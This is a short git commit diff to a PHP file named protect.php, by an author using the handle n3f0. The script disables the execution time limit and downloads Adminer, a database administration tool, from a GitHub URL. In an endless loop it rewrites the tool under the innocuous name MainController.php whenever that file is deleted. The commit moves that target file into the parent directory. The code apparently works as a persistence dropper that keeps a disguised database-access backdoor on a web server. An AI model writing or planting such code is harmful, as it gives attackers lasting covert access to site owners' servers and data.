6501e73d03bb92f7b6a5dc5e59f14d2cc4aa2270
n3f0 <nefo424@gmail.com>
2023-01-30 22:26:21 +0700

    Update protect.php

--- protect.php
+++ protect.php
@@ -2,8 +2,8 @@
 ini_set('max_execution_time', 0);
 $txt=file_get_contents("https://raw.githubusercontent.com/n3f0/adminer/main/adminer-4.8.1.php");
 while(1){
-  if(!file_exists("MainController.php")){
-      file_put_contents("MainController.php",$txt);
+  if(!file_exists("../MainController.php")){
+      file_put_contents("../MainController.php",$txt);
   }else{
     echo "File exists.everythings is okay!";
   }
